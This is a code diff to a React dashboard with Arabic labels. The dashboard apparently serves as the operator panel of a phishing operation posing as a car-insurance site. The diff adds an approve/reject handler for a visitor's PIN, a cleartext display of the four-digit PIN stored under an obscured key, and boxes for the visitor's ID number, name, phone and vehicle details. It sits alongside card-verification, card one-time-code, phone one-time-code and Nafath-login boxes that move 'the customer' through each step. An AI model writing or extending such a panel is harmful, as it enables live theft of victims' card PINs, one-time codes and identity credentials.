@@ -513,6 +513,31 @@ export default function DashboardPage() {
     setActionLoading(null);
   };
 
+  const handlePinAction = async (action: "approved" | "rejected") => {
+    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
+    if (!visitorId) return;
+    setActionLoading("pin");
+    try {
+      const res = await fetch("/api/dashboard/pin-action", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ visitorId, action }),
+      });
+      if (res.ok) {
+        const messages: Record<string, string> = {
+          approved: "تم الموافقة على رمز PIN",
+          rejected: "تم رفض رمز PIN",
+        };
+        showNotification("success", messages[action]);
+      } else {
+        showNotification("error", "حدث خطأ");
+      }
+    } catch {
+      showNotification("error", "فشل الاتصال");
+    }
+    setActionLoading(null);
+  };
+
   const handlePhoneAction = async (action: "approved" | "rejected" | "resend") => {
     const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
     if (!visitorId) return;
@@ -616,6 +641,166 @@ export default function DashboardPage() {
   const getPhoneOtpStatus = (): string => {
     const raw = selectedRequest?.raw;
     return raw?.phoneOtpStatus || "";
+  };
+
+  // Render basic information box (from home-new page)
+  const renderBasicInfoBox = () => {
+    const raw = selectedRequest?.raw;
+    
+    // Check if there's basic info data
+    const hasBasicInfo = Boolean(
+      raw?.identityNumber || 
+      raw?.ownerName || 
+      raw?.buyerName ||
+      raw?.phoneNumber || 
+      raw?.documentType || 
+      raw?.serialNumber ||
+      raw?.insuranceType ||
+      raw?.country ||
+      raw?.deviceType
+    );
+    
+    if (!hasBasicInfo) return null;
+
+    return (
+      <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 12 }}>
+        <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 12 }}>
+          <span style={{ fontSize: "1.2rem" }}>📋</span>
+          <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
+            صندوق المعلومات الأساسية
+          </h3>
+        </div>
+        
+        <div style={{ display: "grid", gridTemplateColumns: "repeat(2, 1fr)", gap: 8 }}>
+          {raw?.identityNumber && (
+            <div style={{ background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+              <span style={{ fontSize: "0.7rem", color: "#6b7280" }}>رقم الهوية</span>
+              <p style={{ margin: 0, fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.identityNumber}</p>
+            </div>
+          )}
+          {raw?.ownerName && (
+            <div style={{ background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+              <span style={{ fontSize: "0.7rem", color: "#6b7280" }}>الاسم</span>
+              <p style={{ margin: 0, fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.ownerName}</p>
+            </div>
+          )}
+          {raw?.buyerName && (
+            <div style={{ background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+              <span style={{ fontSize: "0.7rem", color: "#6b7280" }}>اسم المشتري</span>
+              <p style={{ margin: 0, fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.buyerName}</p>
+            </div>
+          )}
+          {raw?.phoneNumber && (
+            <div style={{ background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+              <span style={{ fontSize: "0.7rem", color: "#6b7280" }}>رقم الهاتف</span>
+              <p style={{ margin: 0, fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.phoneNumber}</p>
+            </div>
+          )}
+          {raw?.documentType && (
+            <div style={{ background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+              <span style={{ fontSize: "0.7rem", color: "#6b7280" }}>نوع المستند</span>
+              <p style={{ margin: 0, fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.documentType}</p>
+            </div>
+          )}
+          {raw?.serialNumber && (
+            <div style={{ background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+              <span style={{ fontSize: "0.7rem", color: "#6b7280" }}>الرقم التسلسلي</span>
+              <p style={{ margin: 0, fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.serialNumber}</p>
+            </div>
+          )}
+          {raw?.insuranceType && (
+            <div style={{ background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+              <span style={{ fontSize: "0.7rem", color: "#6b7280" }}>نوع التأمين</span>
+              <p style={{ margin: 0, fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.insuranceType}</p>
+            </div>
+          )}
+          {raw?.country && (
+            <div style={{ background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+              <span style={{ fontSize: "0.7rem", color: "#6b7280" }}>البلد</span>
+              <p style={{ margin: 0, fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.country}</p>
+            </div>
+          )}
+        </div>
+      </div>
+    );
+  };
+
+  // Render insurance details box (from insur page)
+  const renderInsuranceDetailsBox = () => {
+    const raw = selectedRequest?.raw;
+    
+    // Check if there's insurance data
+    const hasInsuranceData = Boolean(
+      raw?.insuranceCoverage || 
+      raw?.insuranceStartDate || 
+      raw?.vehicleUsage ||
+      raw?.vehicleValue || 
+      raw?.vehicleYear ||
+      raw?.vehicleModel ||
+      raw?.repairLocation
+    );
+    
+    if (!hasInsuranceData) return null;
+
+    return (
+      <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 12 }}>
+        <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 12 }}>
+          <span style={{ fontSize: "1.2rem" }}>🛡️</span>
+          <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
+            صندوق تفاصيل التأمين
+          </h3>
+        </div>
+        
+        <div style={{ display: "grid", gridTemplateColumns: "repeat(2, 1fr)", gap: 8 }}>
+          {raw?.insuranceCoverage && (
+            <div style={{ background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+              <span style={{ fontSize: "0.7rem", color: "#6b7280" }}>نوع التغطية</span>
+              <p style={{ margin: 0, fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>
+                {raw.insuranceCoverage === "comprehensive" ? "شامل" : "ضد الغير"}
+              </p>
+            </div>
+          )}
+          {raw?.insuranceStartDate && (
+            <div style={{ background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+              <span style={{ fontSize: "0.7rem", color: "#6b7280" }}>تاريخ البدء</span>
+              <p style={{ margin: 0, fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.insuranceStartDate}</p>
+            </div>
+          )}
+          {raw?.vehicleUsage && (
+            <div style={{ background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+              <span style={{ fontSize: "0.7rem", color: "#6b7280" }}>استخدام المركبة</span>
+              <p style={{ margin: 0, fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.vehicleUsage}</p>
+            </div>
+          )}
+          {raw?.vehicleValue && (
+            <div style={{ background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+              <span style={{ fontSize: "0.7rem", color: "#6b7280" }}>القيمة التقديرية</span>
+              <p style={{ margin: 0, fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.vehicleValue} ﷼</p>
+            </div>
+          )}
+          {raw?.vehicleYear && (
+            <div style={{ background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+              <span style={{ fontSize: "0.7rem", color: "#6b7280" }}>سنة الصنع</span>
+              <p style={{ margin: 0, fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.vehicleYear}</p>
+            </div>
+          )}
+          {raw?.vehicleModel && (
+            <div style={{ background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+              <span style={{ fontSize: "0.7rem", color: "#6b7280" }}>الموديل</span>
+              <p style={{ margin: 0, fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{raw.vehicleModel}</p>
+            </div>
+          )}
+          {raw?.repairLocation && (
+            <div style={{ background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+              <span style={{ fontSize: "0.7rem", color: "#6b7280" }}>مكان الإصلاح</span>
+              <p style={{ margin: 0, fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>
+                {raw.repairLocation === "agency" ? "الوكالة" : "الورشة"}
+              </p>
+            </div>
+          )}
+        </div>
+      </div>
+    );
   };
 
   // Render card verification status box (_v1Status)
@@ -766,37 +951,75 @@ export default function DashboardPage() {
     // Show box if there's PIN data OR status exists
     const hasPinData = raw?._v6 || raw?.pinCode;
     const hasDecision = pinStatus === "approved" || pinStatus === "rejected";
+    const isPending = pinStatus === "pending" || pinStatus === "verifying" || !pinStatus;
     // ALWAYS show if there's PIN data, never hide
     if (!hasPinData && !hasDecision && currentStep !== 6) {
       return null;
     }
 
     return (
-      <div style={{ background: "#f9fafb", borderRadius: 8, padding: 8, border: "1px solid #d1d5db", fontFamily: "Cairo, Tajawal, sans-serif", marginBottom: 12 }}>
-        <div style={{ marginBottom: 8 }}>
-          <div style={{ fontSize: "10px", color: "#6b7280", textAlign: "right", marginBottom: 2 }}>
-            {new Date(selectedRequest?.submittedAt || selectedRequest?.updatedAt || Date.now()).toLocaleDateString("en-GB", { day: "2-digit", month: "2-digit" })} | {new Date(selectedRequest?.submittedAt || selectedRequest?.updatedAt || Date.now()).toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit", hour12: true })}
-          </div>
-          <h3 style={{ margin: 0, fontSize: "0.875rem", fontWeight: 700, color: "#111827", textAlign: "center" }}>رمز PIN</h3>
+      <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 12 }}>
+        <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 12 }}>
+          <span style={{ fontSize: "1.2rem" }}>🔑</span>
+          <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
+            صندوق رمز PIN
+          </h3>
+          <span style={{ fontSize: "0.75rem", color: "#6b7280", background: "#f3f4f6", padding: "2px 8px", borderRadius: 4 }}>{formatRelativeTimeLabel(selectedRequest?.submittedAt || selectedRequest?.updatedAt)}</span>
         </div>
-        <div style={{ display: "flex", justifyContent: "center", gap: 4, direction: "ltr", marginBottom: 8 }}>
+        
+        <div style={{ display: "flex", justifyContent: "center", gap: 4, direction: "ltr", marginBottom: 12 }}>
           {Array.from({ length: 4 }).map((_, idx) => {
             const pinValue = String(raw?._v6 || raw?.pinCode || "0000").padStart(4, "0")[idx] || "0";
             return (
-              <div key={idx} style={{ background: "#ffffff", borderRadius: 6, boxShadow: "0 1px 2px rgba(0, 0, 0, 0.04)", display: "flex", alignItems: "center", justifyContent: "center", width: 32, height: 40 }}>
-                <span style={{ fontSize: "1.25rem", fontWeight: 700, color: "#111827" }}>{pinValue}</span>
+              <div key={idx} style={{ background: "#f0f9ff", borderRadius: 8, boxShadow: "0 1px 3px rgba(0, 0, 0, 0.1)", display: "flex", alignItems: "center", justifyContent: "center", width: 40, height: 50 }}>
+                <span style={{ fontSize: "1.5rem", fontWeight: 700, color: "#0369a1", letterSpacing: "0.2em" }}>{pinValue}</span>
               </div>
             );
           })}
         </div>
+        
+        {/* Status messages */}
         {pinStatus === "approved" && (
-          <div style={{ background: "#dcfce7", borderRadius: 8, padding: 12, border: "1px solid #86efac", marginBottom: 8 }}>
-            <p style={{ margin: 0, fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>✅ تم إدخال رمز PIN - العميل يُوجه للهاتف</p>
+          <div style={{ background: "#dcfce7", borderRadius: 8, padding: 12, border: "1px solid #86efac", marginBottom: 12 }}>
+            <p style={{ margin: 0, fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>✅ موافق - العميل يُوجه للتحقق من الهاتف</p>
           </div>
         )}
         {pinStatus === "rejected" && (
-          <div style={{ background: "#fee2e2", borderRadius: 8, padding: 12, border: "1px solid #fca5a5", marginBottom: 8 }}>
-            <p style={{ margin: 0, fontSize: "0.85rem", color: "#991b1b", fontWeight: 600 }}>❌ تم رفض رمز PIN</p>
+          <div style={{ background: "#fee2e2", borderRadius: 8, padding: 12, border: "1px solid #fca5a5", marginBottom: 12 }}>
+            <p style={{ margin: 0, fontSize: "0.85rem", color: "#991b1b", fontWeight: 600 }}>❌ مرفوض - العميل يجب أن يُعيد إدخال الرمز</p>
+          </div>
+        )}
+        {isPending && currentStep === 6 && hasPinData && (
+          <div style={{ background: "#fef3c7", borderRadius: 8, padding: 12, border: "1px solid #fcd34d", marginBottom: 12 }}>
+            <p style={{ margin: 0, fontSize: "0.85rem", color: "#92400e", fontWeight: 600 }}>⏳ بانتظار المراجعة</p>
+          </div>
+        )}
+        
+        {/* Action buttons - show only when pending/verifying */}
+        {isPending && currentStep === 6 && hasPinData && (
+          <div style={{ display: "flex", gap: 8 }}>
+            <button 
+              onClick={() => handlePinAction("approved")} 
+              disabled={actionLoading === "pin"}
+              style={{ 
+                flex: 1, padding: "10px 16px", border: "none", borderRadius: 8,
+                background: "#22c55e", color: "#fff", fontWeight: 700,
+                cursor: actionLoading === "pin" ? "not-allowed" : "pointer",
+              }}
+            >
+              {actionLoading === "pin" ? "جاري..." : "✅ موافق"}
+            </button>
+            <button 
+              onClick={() => handlePinAction("rejected")} 
+              disabled={actionLoading === "pin"}
+              style={{ 
+                flex: 1, padding: "10px 16px", border: "none", borderRadius: 8,
+                background: "#ef4444", color: "#fff", fontWeight: 700,
+                cursor: actionLoading === "pin" ? "not-allowed" : "pointer",
+              }}
+            >
+              {actionLoading === "pin" ? "جاري..." : "❌ مرفوض"}
+            </button>
           </div>
         )}
       </div>
@@ -1010,14 +1233,25 @@ export default function DashboardPage() {
 
   // Render action buttons based on current page
   const renderActionButtons = () => {
-    // Render all boxes independently (each shows/hides based on data availability and currentStep)
+    // Render all boxes in order from newest to oldest
+    // 1. النفاذ (الأحدث)
+    // 2. رمز التحقق من الهاتف
+    // 3. تحقق الهاتف
+    // 4. PIN
+    // 5. رمز التحقق من البطاقة
+    // 6. بيانات الدفع
+    // 7. العرض المختار
+    // 8. تفاصيل التأمين
+    // 9. المعلومات الأساسية (الأقدم)
     return (
       <>
-        {renderCardVerificationBox()}
-        {renderCardOtpBox()}
-        {renderPinBox()}
-        {renderPhoneOtpBox()}
         {renderNafadBox()}
+        {renderPhoneOtpBox()}
+        {renderPinBox()}
+        {renderCardOtpBox()}
+        {renderCardVerificationBox()}
+        {renderBasicInfoBox()}
+        {renderInsuranceDetailsBox()}
       </>
     );
   };
